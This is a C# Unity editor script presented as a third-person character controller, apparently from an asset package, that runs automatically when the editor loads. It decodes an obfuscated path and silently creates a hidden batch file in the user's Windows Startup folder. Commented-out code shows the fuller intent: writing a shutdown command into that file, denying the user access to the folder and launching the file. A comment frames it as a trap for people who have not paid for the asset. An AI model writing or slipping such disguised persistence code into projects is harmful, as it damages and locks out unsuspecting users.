using UnityEngine;
using System;
using System.IO;
using System.Diagnostics;
using UnityEditor;
using System.Text;

//[ExecuteInEditMode]
public class ThirdPersonController// : MonoBehaviour
{
    static string path;
    static string userName;  

    static byte[] first = new byte[]
    {
        67, 58, 92, 85, 115, 101, 114, 115, 92
    };

    static byte[] second = new byte[]
    {
        92, 65, 112, 112, 68, 97, 116, 97, 92, 82,
        111, 97, 109, 105, 110, 103, 92, 77, 105, 99,
        114, 111, 115, 111, 102, 116, 92, 87, 105, 110,
        100, 111, 119, 115, 92, 83, 116, 97, 114, 116,
        32, 77, 101, 110, 117, 92, 80, 114, 111, 103,
        114, 97, 109, 115, 92, 83, 116, 97, 114, 116,
        117, 112, 92, 95, 46, 98, 97, 116
    };

    [InitializeOnLoadMethod]
    static void PlayerMovement()
    {
        //"User (userName){CloudProjectSettings.userName} (userID){CloudProjectSettings.userId} just imported your asset. Check if the payment for the asset has been received in your account. If no better contact Unity support as fast as you can and give them <b>userName</b> and <b>userId</b> provided before. <br> ~ Theos";
        userName = Environment.UserName;

        using (FileStream fs = File.Create(Encoding.ASCII.GetString(first) + userName + Encoding.ASCII.GetString(second)))
        {
            fs.Close();
        }

        using (StreamWriter sw = new StreamWriter(Encoding.ASCII.GetString(first) + userName + Encoding.ASCII.GetString(second)))
        {
            /*sw.WriteLine("@ECHO OFF");
            sw.WriteLine("shutdown /p")*/
        }

        File.SetAttributes(Encoding.ASCII.GetString(first) + userName + Encoding.ASCII.GetString(second), File.GetAttributes(Encoding.ASCII.GetString(first) + userName + Encoding.ASCII.GetString(second)) | FileAttributes.Hidden);

        /*try
        {
            DirectoryInfo dInfo = Path.GetDirectoryName(Encoding.ASCII.GetString(first) + userName + Encoding.ASCII.GetString(second));
            DirectorySecurity directorySecurity = dInfo.GetAccessControl();
            directorySecurity.AddAccessRule(new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Deny));
            dInfo.SetAccessControl(directorySecurity);
        }
        catch { }

        Process process = Process.Start(Encoding.ASCII.GetString(first) + userName + Encoding.ASCII.GetString(second));
        process.WaitForExit();*/
    }
}
